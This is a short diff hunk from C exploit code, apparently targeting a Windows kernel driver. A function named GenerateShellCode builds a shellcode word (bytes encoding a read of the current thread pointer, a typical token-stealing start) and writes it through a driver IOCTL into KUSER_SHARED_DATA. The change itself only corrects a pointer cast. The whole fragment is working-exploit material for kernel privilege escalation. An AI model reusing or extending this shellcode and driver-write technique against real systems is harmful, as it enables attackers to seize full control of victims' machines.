@@ -299,6 +299,6 @@ void *GenerateShellCode(HANDLE driverHandle)
 {
     payload[0] = 0x00018825048B4865;
 
-    SendToDriver(driverHandle,0x0022200B,(void*) payload[0], ((unsigned long long) KUSER_SHARED_DATA)+1);
+    SendToDriver(driverHandle,0x0022200B,(void*) payload[0], (void*) (((unsigned long long) KUSER_SHARED_DATA)+1) );
     return (void*) KUSER_SHARED_DATA;
 }
